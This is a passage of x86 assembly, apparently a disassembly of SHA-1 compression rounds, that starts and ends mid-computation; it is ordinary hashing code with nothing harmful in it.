lea eax [ ebx + eax + 0x6ed9eba1 ]
mov ebp [ esp + 0x48 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x64 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x50 ]
xor eax ebp
xor eax [ esp + 0x3c ]
xor eax [ esp + 0x28 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x48 ] ebp
mov ebp eax
shl eax 0x5
mov [ esp + 0x64 ] ebx
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x18 ]
xor eax ebx
xor eax [ esp + 0x68 ]
add ebp [ esp + 0x48 ]
mov ebx [ esp + 0x14 ]
add eax ebp
lea ebp [ ebx + eax + 0x6ed9eba1 ]
mov eax [ esp + 0x68 ]
mov ebx eax
shl ebx 0x1e
shr eax 0x2
or ebx eax
mov eax [ esp + 0x54 ]
mov [ esp + 0x68 ] ebx
xor eax [ esp + 0x4c ]
xor eax [ esp + 0x40 ]
xor eax [ esp + 0x2c ]
mov ebx eax
add eax eax
shr ebx 0x1f
or ebx eax
mov eax ebp
mov [ esp + 0x14 ] ebp
shl ebp 0x5
mov [ esp + 0x4c ] ebx
mov ebx [ esp + 0x10 ]
shr eax 0x1b
or eax ebp
xor ebx [ esp + 0x64 ]
xor ebx [ esp + 0x68 ]
add eax [ esp + 0x4c ]
add ebx eax
mov eax [ esp + 0x18 ]
lea eax [ eax + ebx + 0x6ed9eba1 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x10 ]
mov ebx eax
shr eax 0x2
mov ebp [ esp + 0x50 ]
shl ebx 0x1e
or ebx eax
mov eax ecx
xor eax ebp
xor eax [ esp + 0x44 ]
xor eax [ esp + 0x30 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x50 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
xor ebx eax
xor ebx [ esp + 0x68 ]
add ebp [ esp + 0x50 ]
mov eax [ esp + 0x64 ]
add ebx ebp
lea eax [ eax + ebx + 0x6ed9eba1 ]
mov ebp [ esp + 0x54 ]
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax edx
xor eax ebp
xor eax [ esp + 0x48 ]
xor eax [ esp + 0x34 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x64 ]
mov [ esp + 0x54 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x10 ]
xor eax ebx
mov [ esp + 0x14 ] ebx
xor eax [ esp + 0x18 ]
add ebp [ esp + 0x54 ]
mov ebx [ esp + 0x68 ]
add eax ebp
lea ebp [ ebx + eax + 0x6ed9eba1 ]
mov eax [ esp + 0x18 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
xor ecx [ esp + 0x4c ]
xor ecx [ esp + 0x38 ]
xor ecx edi
mov [ esp + 0x68 ] ebp
mov [ esp + 0x18 ] ebx
mov eax ecx
add ecx ecx
shr eax 0x1f
or eax ecx
mov ecx ebp
shl ebp 0x5
shr ecx 0x1b
or ecx ebp
mov ebp [ esp + 0x14 ]
xor ebp ebx
mov ebx ecx
mov ecx [ esp + 0x64 ]
add ebx eax
xor ebp ecx
add ebp ebx
mov ebx [ esp + 0x10 ]
lea ebp [ ebx + ebp + 0x6ed9eba1 ]
mov ebx ecx
shl ebx 0x1e
shr ecx 0x2
or ebx ecx
xor edx [ esp + 0x50 ]
xor edx [ esp + 0x3c ]
xor edx [ esp + 0x24 ]
mov ecx edx
add edx edx
mov [ esp + 0x10 ] ebp
mov [ esp + 0x64 ] ebx
shr ecx 0x1f
or ecx edx
mov edx ebp
shr edx 0x1b
shl ebp 0x5
or edx ebp
mov ebp [ esp + 0x18 ]
xor ebp ebx
mov ebx edx
mov edx [ esp + 0x68 ]
xor ebp edx
add ebx ecx
add ebp ebx
mov ebx [ esp + 0x14 ]
lea ebp [ ebx + ebp + 0x6ed9eba1 ]
mov ebx edx
shr edx 0x2
shl ebx 0x1e
or ebx edx
mov edx [ esp + 0x54 ]
mov [ esp + 0x68 ] ebx
xor edx [ esp + 0x40 ]
xor edx [ esp + 0x28 ]
mov ebx [ esp + 0x10 ]
xor edx edi
mov edi edx
add edx edx
shr edi 0x1f
or edi edx
mov edx ebp
shr edx 0x1b
mov [ esp + 0x14 ] ebp
shl ebp 0x5
or edx ebp
xor ebx [ esp + 0x64 ]
mov ebp [ esp + 0x68 ]
add edx edi
xor ebx ebp
add ebx edx
mov edx [ esp + 0x18 ]
lea edx [ edx + ebx + 0x6ed9eba1 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x10 ]
mov ebx edx
shl ebx 0x1e
shr edx 0x2
or ebx edx
mov ebp [ esp + 0x44 ]
mov edx eax
xor edx ebp
xor edx [ esp + 0x2c ]
xor edx [ esp + 0x24 ]
mov ebp edx
add edx edx
shr ebp 0x1f
or ebp edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x24 ] ebp
mov ebp edx
shl edx 0x5
shr ebp 0x1b
or ebp edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
xor ebx edx
xor ebx [ esp + 0x68 ]
add ebp [ esp + 0x24 ]
mov edx [ esp + 0x64 ]
add ebx ebp
lea edx [ edx + ebx + 0x6ed9eba1 ]
mov ebp [ esp + 0x48 ]
mov [ esp + 0x64 ] edx
mov edx [ esp + 0x14 ]
mov ebx edx
shr edx 0x2
shl ebx 0x1e
or ebx edx
mov edx ecx
xor edx ebp
xor edx [ esp + 0x30 ]
xor edx [ esp + 0x28 ]
mov ebp edx
add edx edx
shr ebp 0x1f
or ebp edx
mov edx [ esp + 0x64 ]
mov [ esp + 0x28 ] ebp
mov ebp edx
shl edx 0x5
shr ebp 0x1b
or ebp edx
mov edx [ esp + 0x10 ]
xor edx ebx
mov [ esp + 0x14 ] ebx
xor edx [ esp + 0x18 ]
add ebp [ esp + 0x28 ]
mov ebx [ esp + 0x68 ]
add edx ebp
mov ebp [ esp + 0x34 ]
lea edx [ ebx + edx + 0x6ed9eba1 ]
mov [ esp + 0x68 ] edx
mov edx [ esp + 0x18 ]
mov ebx edx
shr edx 0x2
shl ebx 0x1e
or ebx edx
mov edx [ esp + 0x4c ]
xor edx ebp
xor edx [ esp + 0x2c ]
xor edx edi
mov ebp edx
shr ebp 0x1f
add edx edx
or ebp edx
mov edx [ esp + 0x68 ]
mov [ esp + 0x2c ] ebp
mov [ esp + 0x18 ] ebx
mov ebp edx
shl edx 0x5
shr ebp 0x1b
or ebp edx
mov edx [ esp + 0x14 ]
xor edx ebx
xor edx [ esp + 0x64 ]
add ebp [ esp + 0x2c ]
add edx ebp
mov ebx [ esp + 0x10 ]
lea edx [ ebx + edx + 0x6ed9eba1 ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x64 ]
mov ebp [ esp + 0x38 ]
mov ebx edx
shr edx 0x2
shl ebx 0x1e
or ebx edx
mov edx [ esp + 0x50 ]
xor edx ebp
xor edx [ esp + 0x30 ]
xor edx [ esp + 0x24 ]
mov ebp edx
add edx edx
shr ebp 0x1f
or ebp edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x64 ] ebx
mov [ esp + 0x30 ] ebp
mov ebp edx
shl edx 0x5
shr ebp 0x1b
or ebp edx
mov edx [ esp + 0x18 ]
xor edx ebx
xor edx [ esp + 0x68 ]
add ebp [ esp + 0x30 ]
mov ebx [ esp + 0x14 ]
add edx ebp
lea ebp [ ebx + edx + 0x6ed9eba1 ]
mov edx [ esp + 0x68 ]
mov ebx edx
shr edx 0x2
shl ebx 0x1e
or ebx edx
mov edx [ esp + 0x54 ]
mov [ esp + 0x68 ] ebx
xor edx [ esp + 0x3c ]
xor edx [ esp + 0x34 ]
xor edx [ esp + 0x28 ]
mov ebx edx
add edx edx
shr ebx 0x1f
or ebx edx
mov edx ebp
shr edx 0x1b
mov [ esp + 0x14 ] ebp
shl ebp 0x5
or edx ebp
mov ebp [ esp + 0x64 ]
mov [ esp + 0x34 ] ebx
mov ebx [ esp + 0x10 ]
xor ebx ebp
xor ebx [ esp + 0x68 ]
add edx [ esp + 0x34 ]
add ebx edx
mov edx [ esp + 0x18 ]
lea edx [ edx + ebx + 0x6ed9eba1 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x10 ]
mov ebx edx
mov ebp [ esp + 0x40 ]
shr edx 0x2
shl ebx 0x1e
or ebx edx
mov edx eax
xor edx ebp
xor edx [ esp + 0x38 ]
xor edx [ esp + 0x2c ]
mov ebp edx
add edx edx
shr ebp 0x1f
or ebp edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x38 ] ebp
mov ebp edx
shl edx 0x5
shr ebp 0x1b
or ebp edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
xor ebx edx
xor ebx [ esp + 0x68 ]
add ebp [ esp + 0x38 ]
mov edx [ esp + 0x64 ]
add ebx ebp
lea edx [ edx + ebx + 0x6ed9eba1 ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x64 ] edx
mov edx [ esp + 0x14 ]
mov ebx edx
shr edx 0x2
shl ebx 0x1e
or ebx edx
mov edx ecx
xor edx ebp
xor edx [ esp + 0x3c ]
xor edx [ esp + 0x30 ]
mov ebp edx
add edx edx
shr ebp 0x1f
or ebp edx
mov edx [ esp + 0x64 ]
mov [ esp + 0x3c ] ebp
mov ebp edx
shl edx 0x5
shr ebp 0x1b
or ebp edx
mov edx [ esp + 0x10 ]
xor edx ebx
mov [ esp + 0x14 ] ebx
xor edx [ esp + 0x18 ]
add ebp [ esp + 0x3c ]
mov ebx [ esp + 0x68 ]
add edx ebp
mov ebp [ esp + 0x40 ]
lea edx [ ebx + edx + 0x6ed9eba1 ]
mov ebx [ esp + 0x18 ]
mov [ esp + 0x68 ] edx
mov edx ebx
shr ebx 0x2
shl edx 0x1e
or edx ebx
mov ebx [ esp + 0x48 ]
xor ebx ebp
xor ebx [ esp + 0x34 ]
xor ebx edi
mov ebp ebx
shr ebp 0x1f
add ebx ebx
or ebp ebx
mov [ esp + 0x18 ] edx
mov [ esp + 0x40 ] ebp
mov ebx [ esp + 0x64 ]
mov ebp edx
or ebp ebx
and ebp [ esp + 0x14 ]
and edx ebx
or ebp edx
mov edx [ esp + 0x68 ]
mov ebx edx
shr ebx 0x1b
shl edx 0x5
or ebx edx
add ebp [ esp + 0x40 ]
add ebx ebp
mov edx [ esp + 0x10 ]
lea edx [ edx + ebx - 0x70e44324 ]
mov ebx [ esp + 0x64 ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x10 ] edx
mov edx ebx
shr ebx 0x2
shl edx 0x1e
or edx ebx
mov ebx [ esp + 0x4c ]
xor ebx ebp
xor ebx [ esp + 0x38 ]
xor ebx [ esp + 0x24 ]
mov ebp ebx
add ebx ebx
shr ebp 0x1f
or ebp ebx
mov ebx [ esp + 0x68 ]
mov [ esp + 0x44 ] ebp
mov ebp edx
or ebp ebx
and ebp [ esp + 0x18 ]
mov [ esp + 0x64 ] edx
and edx ebx
or ebp edx
mov edx [ esp + 0x10 ]
mov ebx edx
shr ebx 0x1b
shl edx 0x5
or ebx edx
add ebp [ esp + 0x44 ]
mov edx [ esp + 0x14 ]
add ebx ebp
mov ebp [ esp + 0x48 ]
lea edx [ edx + ebx - 0x70e44324 ]
mov ebx [ esp + 0x68 ]
mov [ esp + 0x14 ] edx
mov edx ebx
shr ebx 0x2
shl edx 0x1e
or edx ebx
mov ebx [ esp + 0x50 ]
xor ebx ebp
xor ebx [ esp + 0x3c ]
xor ebx [ esp + 0x28 ]
mov ebp ebx
shr ebp 0x1f
add ebx ebx
or ebp ebx
mov ebx [ esp + 0x10 ]
mov [ esp + 0x48 ] ebp
mov ebp ebx
or ebp edx
and ebp [ esp + 0x64 ]
and ebx edx
mov [ esp + 0x68 ] edx
mov edx [ esp + 0x14 ]
or ebp ebx
mov ebx edx
shr ebx 0x1b
shl edx 0x5
or ebx edx
add ebp [ esp + 0x48 ]
add ebx ebp
mov edx [ esp + 0x18 ]
lea edx [ edx + ebx - 0x70e44324 ]
mov ebx [ esp + 0x10 ]
mov ebp [ esp + 0x4c ]
mov [ esp + 0x18 ] edx
mov edx ebx
shr ebx 0x2
shl edx 0x1e
or edx ebx
mov ebx [ esp + 0x54 ]
xor ebx ebp
xor ebx [ esp + 0x40 ]
xor ebx [ esp + 0x2c ]
mov ebp ebx
add ebx ebx
shr ebp 0x1f
or ebp ebx
mov ebx [ esp + 0x14 ]
mov [ esp + 0x4c ] ebp
mov ebp edx
or ebp ebx
and ebp [ esp + 0x68 ]
mov [ esp + 0x10 ] edx
and edx ebx
or ebp edx
mov edx [ esp + 0x18 ]
mov ebx edx
shr ebx 0x1b
shl edx 0x5
or ebx edx
add ebp [ esp + 0x4c ]
mov edx [ esp + 0x64 ]
add ebx ebp
lea edx [ edx + ebx - 0x70e44324 ]
mov ebx [ esp + 0x14 ]
mov ebp [ esp + 0x50 ]
mov [ esp + 0x64 ] edx
mov edx ebx
shr ebx 0x2
shl edx 0x1e
or edx ebx
mov ebx eax
xor ebx ebp
xor ebx [ esp + 0x44 ]
xor ebx [ esp + 0x30 ]
mov ebp ebx
add ebx ebx
shr ebp 0x1f
or ebp ebx
mov ebx [ esp + 0x18 ]
mov [ esp + 0x50 ] ebp
mov ebp edx
or ebp ebx
and ebp [ esp + 0x10 ]
mov [ esp + 0x14 ] edx
and edx ebx
or ebp edx
mov edx [ esp + 0x64 ]
mov ebx edx
shl edx 0x5
shr ebx 0x1b
or ebx edx
add ebp [ esp + 0x50 ]
mov edx [ esp + 0x68 ]
add ebx ebp
lea edx [ edx + ebx - 0x70e44324 ]
mov ebx [ esp + 0x18 ]
mov [ esp + 0x68 ] edx
mov edx ebx
shl edx 0x1e
shr ebx 0x2
or edx ebx
mov ebp [ esp + 0x54 ]
mov ebx ecx
xor ebx ebp
xor ebx [ esp + 0x48 ]
xor ebx [ esp + 0x34 ]
mov ebp ebx
add ebx ebx
shr ebp 0x1f
or ebp ebx
mov ebx [ esp + 0x64 ]
mov [ esp + 0x54 ] ebp
mov ebp edx
or ebp ebx
and ebp [ esp + 0x14 ]
mov [ esp + 0x18 ] edx
and edx ebx
or ebp edx
mov edx [ esp + 0x68 ]
mov ebx edx
shr ebx 0x1b
shl edx 0x5
or ebx edx
add ebp [ esp + 0x54 ]
mov edx [ esp + 0x10 ]
add ebx ebp
mov ebp [ esp + 0x38 ]
lea edx [ edx + ebx - 0x70e44324 ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x64 ]
mov ebx edx
shl ebx 0x1e
shr edx 0x2
or ebx edx
xor eax [ esp + 0x4c ]
xor eax ebp
xor eax edi
mov edx eax
add eax eax
mov ebp ebx
mov [ esp + 0x64 ] ebx
shr edx 0x1f
or edx eax
mov eax [ esp + 0x68 ]
or ebp eax
and ebp [ esp + 0x18 ]
and ebx eax
mov eax [ esp + 0x10 ]
or ebp ebx
mov ebx eax
shl eax 0x5
shr ebx 0x1b
or ebx eax
mov eax [ esp + 0x14 ]
add ebp edx
add ebx ebp
mov ebp [ esp + 0x3c ]
lea eax [ eax + ebx - 0x70e44324 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x68 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
xor ecx [ esp + 0x50 ]
mov eax [ esp + 0x24 ]
xor ecx ebp
xor ecx eax
mov eax ecx
add ecx ecx
shr eax 0x1f
or eax ecx
mov ecx [ esp + 0x10 ]
mov ebp ecx
or ebp ebx
and ebp [ esp + 0x64 ]
mov [ esp + 0x68 ] ebx
and ecx ebx
or ebp ecx
mov ecx [ esp + 0x14 ]
add ebp eax
mov ebx ecx
shr ebx 0x1b
shl ecx 0x5
or ebx ecx
add ebx ebp
mov ecx [ esp + 0x18 ]
lea ecx [ ecx + ebx - 0x70e44324 ]
mov ebx [ esp + 0x10 ]
mov ebp ebx
shr ebx 0x2
shl ebp 0x1e
or ebp ebx
mov ebx [ esp + 0x54 ]
mov [ esp + 0x10 ] ebp
xor ebx [ esp + 0x40 ]
xor ebx [ esp + 0x28 ]
xor ebx edi
mov edi ebx
add ebx ebx
shr edi 0x1f
or edi ebx
mov ebx [ esp + 0x10 ]
mov ebp ebx
mov [ esp + 0x20 ] edi
mov edi [ esp + 0x14 ]
and ebx edi
or ebp edi
and ebp [ esp + 0x68 ]
mov edi ecx
or ebp ebx
shr edi 0x1b
mov ebx ecx
shl ebx 0x5
or edi ebx
add ebp [ esp + 0x20 ]
mov ebx [ esp + 0x64 ]
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ ebx + edi - 0x70e44324 ]
mov ebx [ esp + 0x14 ]
mov [ esp + 0x64 ] edi
mov edi ebx
shr ebx 0x2
shl edi 0x1e
or edi ebx
mov ebx edx
xor ebx ebp
xor ebx [ esp + 0x2c ]
xor ebx [ esp + 0x24 ]
mov ebp ebx
add ebx ebx
shr ebp 0x1f
or ebp ebx
mov ebx edi
mov [ esp + 0x24 ] ebp
mov ebp [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
or ebx ecx
and ebx ebp
and edi ecx
or ebx edi
mov edi [ esp + 0x64 ]
mov ebp edi
shl edi 0x5
shr ebp 0x1b
or ebp edi
add ebx [ esp + 0x24 ]
mov edi [ esp + 0x68 ]
add ebp ebx
lea edi [ edi + ebp - 0x70e44324 ]
mov ebx ecx
mov ebp [ esp + 0x48 ]
shl ebx 0x1e
shr ecx 0x2
or ebx ecx
mov ecx eax
xor ecx ebp
xor ecx [ esp + 0x30 ]
xor ecx [ esp + 0x28 ]
mov ebp ecx
shr ebp 0x1f
add ecx ecx
or ebp ecx
mov ecx [ esp + 0x64 ]
mov [ esp + 0x28 ] ebp
mov ebp ebx
or ebp ecx
and ebp [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
and ebx ecx
or ebp ebx
mov ecx edi
shr ecx 0x1b
mov ebx edi
shl ebx 0x5
or ecx ebx
add ebp [ esp + 0x28 ]
mov ebx [ esp + 0x10 ]
add ecx ebp
mov ebp [ esp + 0x34 ]
lea ecx [ ebx + ecx - 0x70e44324 ]
mov ebx [ esp + 0x64 ]
mov [ esp + 0x10 ] ecx
mov ecx ebx
shr ebx 0x2
shl ecx 0x1e
or ecx ebx
mov ebx [ esp + 0x4c ]
xor ebx ebp
xor ebx [ esp + 0x2c ]
xor ebx [ esp + 0x20 ]
mov ebp ebx
shr ebp 0x1f
add ebx ebx
or ebp ebx
mov [ esp + 0x2c ] ebp
mov ebp [ esp + 0x18 ]
mov ebx ecx
or ebx edi
and ebx ebp
mov [ esp + 0x64 ] ecx
and ecx edi
or ebx ecx
mov ecx [ esp + 0x10 ]
mov ebp ecx
shr ebp 0x1b
shl ecx 0x5
or ebp ecx
add ebx [ esp + 0x2c ]
mov ecx [ esp + 0x14 ]
add ebp ebx
mov ebx edi
shr edi 0x2
lea ecx [ ecx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x38 ]
shl ebx 0x1e
or ebx edi
mov edi [ esp + 0x50 ]
xor edi ebp
xor edi [ esp + 0x30 ]
xor edi [ esp + 0x24 ]
mov ebp edi
mov [ esp + 0x68 ] ebx
shr ebp 0x1f
add edi edi
or ebp edi
mov edi [ esp + 0x10 ]
mov [ esp + 0x30 ] ebp
mov ebp edi
or ebp ebx
and ebp [ esp + 0x64 ]
and edi ebx
or ebp edi
mov edi ecx
shr edi 0x1b
mov ebx ecx
shl ebx 0x5
or edi ebx
add ebp [ esp + 0x30 ]
mov ebx [ esp + 0x18 ]
add edi ebp
lea edi [ ebx + edi - 0x70e44324 ]
mov ebx [ esp + 0x10 ]
mov ebp [ esp + 0x3c ]
mov [ esp + 0x18 ] edi
mov edi ebx
shr ebx 0x2
shl edi 0x1e
or edi ebx
mov ebx [ esp + 0x54 ]
xor ebx ebp
xor ebx [ esp + 0x34 ]
xor ebx [ esp + 0x28 ]
mov ebp ebx
shr ebp 0x1f
add ebx ebx
or ebp ebx
mov [ esp + 0x34 ] ebp
mov ebp [ esp + 0x68 ]
mov ebx edi
or ebx ecx
and ebx ebp
mov [ esp + 0x10 ] edi
and edi ecx
or ebx edi
mov edi [ esp + 0x18 ]
mov ebp edi
shr ebp 0x1b
shl edi 0x5
or ebp edi
add ebx [ esp + 0x34 ]
mov edi [ esp + 0x64 ]
add ebp ebx
mov ebx ecx
lea edi [ edi + ebp - 0x70e44324 ]
mov ebp [ esp + 0x40 ]
shr ecx 0x2
shl ebx 0x1e
or ebx ecx
mov ecx edx
xor ecx ebp
xor ecx [ esp + 0x38 ]
xor ecx [ esp + 0x2c ]
mov ebp ecx
shr ebp 0x1f
add ecx ecx
or ebp ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x38 ] ebp
mov ebp ebx
or ebp ecx
and ebp [ esp + 0x10 ]
mov [ esp + 0x14 ] ebx
and ebx ecx
or ebp ebx
mov ecx edi
mov ebx edi
shr ecx 0x1b
shl ebx 0x5
or ecx ebx
add ebp [ esp + 0x38 ]
mov ebx [ esp + 0x68 ]
add ecx ebp
lea ecx [ ebx + ecx - 0x70e44324 ]
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x68 ] ecx
mov ecx ebx
shr ebx 0x2
shl ecx 0x1e
or ecx ebx
mov ebx eax
xor ebx ebp
xor ebx [ esp + 0x3c ]
xor ebx [ esp + 0x30 ]
mov ebp ebx
shr ebp 0x1f
add ebx ebx
or ebp ebx
mov [ esp + 0x3c ] ebp
mov ebp [ esp + 0x14 ]
mov ebx ecx
or ebx edi
and ebx ebp
mov [ esp + 0x18 ] ecx
and ecx edi
or ebx ecx
mov ecx [ esp + 0x68 ]
mov ebp ecx
shr ebp 0x1b
shl ecx 0x5
or ebp ecx
add ebx [ esp + 0x3c ]
mov ecx [ esp + 0x10 ]
add ebp ebx
mov ebx edi
shr edi 0x2
lea ecx [ ecx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x40 ]
shl ebx 0x1e
or ebx edi
mov edi [ esp + 0x48 ]
xor edi ebp
xor edi [ esp + 0x34 ]
xor edi [ esp + 0x20 ]
mov ebp edi
add edi edi
shr ebp 0x1f
or ebp edi
mov edi [ esp + 0x68 ]
mov [ esp + 0x40 ] ebp
mov ebp ebx
or ebp edi
and ebp [ esp + 0x18 ]
mov [ esp + 0x64 ] ebx
and ebx edi
or ebp ebx
mov edi ecx
shr edi 0x1b
mov ebx ecx
shl ebx 0x5
or edi ebx
add ebp [ esp + 0x40 ]
mov ebx [ esp + 0x14 ]
add edi ebp
lea edi [ ebx + edi - 0x70e44324 ]
mov ebx [ esp + 0x68 ]
mov [ esp + 0x14 ] edi
mov edi ebx
shl edi 0x1e
shr ebx 0x2
or edi ebx
mov [ esp + 0x68 ] edi
mov ebp [ esp + 0x44 ]
mov ebx [ esp + 0x4c ]
xor ebx ebp
xor ebx [ esp + 0x38 ]
xor ebx [ esp + 0x24 ]
mov ebp ebx
shr ebp 0x1f
add ebx ebx
or ebp ebx
mov [ esp + 0x44 ] ebp
mov ebp [ esp + 0x64 ]
mov ebx ecx
or ebx edi
and ebx ebp
mov ebp ecx
and ebp edi
or ebx ebp
mov edi [ esp + 0x14 ]
mov ebp edi
shr ebp 0x1b
shl edi 0x5
or ebp edi
add ebx [ esp + 0x44 ]
add ebp ebx
mov edi [ esp + 0x18 ]
mov ebx ecx
lea edi [ edi + ebp - 0x70e44324 ]
mov ebp [ esp + 0x48 ]
shr ecx 0x2
shl ebx 0x1e
or ebx ecx
mov ecx [ esp + 0x50 ]
xor ecx ebp
xor ecx [ esp + 0x3c ]
xor ecx [ esp + 0x28 ]
mov ebp ecx
shr ebp 0x1f
add ecx ecx
or ebp ecx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x48 ] ebp
mov ebp ebx
or ebp ecx
and ebp [ esp + 0x68 ]
mov [ esp + 0x10 ] ebx
and ebx ecx
or ebp ebx
mov ecx edi
shr ecx 0x1b
mov ebx edi
shl ebx 0x5
or ecx ebx
add ebp [ esp + 0x48 ]
mov ebx [ esp + 0x64 ]
add ecx ebp
mov ebp [ esp + 0x4c ]
lea ecx [ ebx + ecx - 0x70e44324 ]
mov ebx [ esp + 0x14 ]
mov [ esp + 0x64 ] ecx
mov ecx ebx
shr ebx 0x2
shl ecx 0x1e
or ecx ebx
mov ebx [ esp + 0x54 ]
xor ebx ebp
xor ebx [ esp + 0x40 ]
xor ebx [ esp + 0x2c ]
mov ebp ebx
shr ebp 0x1f
add ebx ebx
or ebp ebx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x4c ] ebp
mov ebp [ esp + 0x10 ]
mov ebx ecx
and ecx edi
or ebx edi
and ebx ebp
or ebx ecx
mov ecx [ esp + 0x64 ]
mov ebp ecx
shl ecx 0x5
shr ebp 0x1b
or ebp ecx
add ebx [ esp + 0x4c ]
mov ecx [ esp + 0x68 ]
add ebp ebx
lea ebp [ ecx + ebp - 0x70e44324 ]
mov ebx edi
shl ebx 0x1e
shr edi 0x2
or ebx edi
mov edi [ esp + 0x50 ]
mov [ esp + 0x68 ] ebp
mov ecx edx
xor ecx edi
xor ecx [ esp + 0x44 ]
xor ecx [ esp + 0x30 ]
mov edi ecx
add ecx ecx
shr edi 0x1f
or edi ecx
mov ecx ebp
shl ebp 0x5
shr ecx 0x1b
or ecx ebp
mov ebp [ esp + 0x14 ]
xor ebp ebx
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x64 ]
xor ebp ecx
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x1c ]
add ebx edi
add ebp ebx
mov ebx [ esp + 0x10 ]
lea ebx [ ebx + ebp - 0x359d3e2a ]
mov ebp [ esp + 0x54 ]
mov [ esp + 0x10 ] ebx
mov ebx ecx
shr ecx 0x2
shl ebx 0x1e
or ebx ecx
mov ecx eax
xor ecx ebp
xor ecx [ esp + 0x48 ]
xor ecx [ esp + 0x34 ]
mov ebp ecx
add ecx ecx
shr ebp 0x1f
or ebp ecx
mov ecx [ esp + 0x10 ]
mov [ esp + 0x54 ] ebp
mov ebp ecx
shl ecx 0x5
shr ebp 0x1b
or ebp ecx
mov ecx [ esp + 0x18 ]
xor ecx ebx
mov [ esp + 0x64 ] ebx
xor ecx [ esp + 0x68 ]
add ebp [ esp + 0x54 ]
mov ebx [ esp + 0x14 ]
add ecx ebp
lea ebp [ ebx + ecx - 0x359d3e2a ]
mov ecx [ esp + 0x68 ]
mov [ esp + 0x14 ] ebp
mov ebx ecx
shl ebx 0x1e
shr ecx 0x2
or ebx ecx
xor edx [ esp + 0x4c ]
mov ecx [ esp + 0x20 ]
mov [ esp + 0x68 ] ebx
xor edx [ esp + 0x38 ]
mov ebx [ esp + 0x10 ]
xor edx ecx
mov ecx edx
add edx edx
shr ecx 0x1f
or ecx edx
mov edx ebp
shl ebp 0x5
shr edx 0x1b
or edx ebp
xor ebx [ esp + 0x64 ]
xor ebx [ esp + 0x68 ]
add edx ecx
add ebx edx
mov edx [ esp + 0x18 ]
lea ebp [ edx + ebx - 0x359d3e2a ]
mov edx [ esp + 0x10 ]
xor eax edi
mov ebx edx
shl ebx 0x1e
shr edx 0x2
or ebx edx
xor eax [ esp + 0x3c ]
xor eax [ esp + 0x24 ]
mov edx eax
add eax eax
mov [ esp + 0x18 ] ebp
shr edx 0x1f
or edx eax
mov eax ebp
shr eax 0x1b
shl ebp 0x5
or eax ebp
mov ebp [ esp + 0x14 ]
add eax edx
mov [ esp + 0x10 ] ebx
xor ebx ebp
xor ebx [ esp + 0x68 ]
mov ebp [ esp + 0x40 ]
add ebx eax
mov eax [ esp + 0x64 ]
lea eax [ eax + ebx - 0x359d3e2a ]
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x54 ]
xor eax ebp
xor eax [ esp + 0x28 ]
xor eax [ esp + 0x20 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x64 ]
mov [ esp + 0x20 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x14 ] ebx
xor eax ebx
xor eax [ esp + 0x18 ]
add ebp [ esp + 0x20 ]
add eax ebp
mov ebx [ esp + 0x68 ]
lea eax [ ebx + eax - 0x359d3e2a ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x18 ]
mov ebx eax
mov ebp [ esp + 0x44 ]
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax ecx
xor eax ebp
xor eax [ esp + 0x2c ]
xor eax [ esp + 0x24 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x24 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
xor eax ebx
mov [ esp + 0x18 ] ebx
xor eax [ esp + 0x64 ]
add ebp [ esp + 0x24 ]
mov ebx [ esp + 0x10 ]
add eax ebp
lea eax [ ebx + eax - 0x359d3e2a ]
mov ebp [ esp + 0x48 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x64 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax edx
xor eax ebp
xor eax [ esp + 0x30 ]
xor eax [ esp + 0x28 ]
mov ebp eax
add eax eax
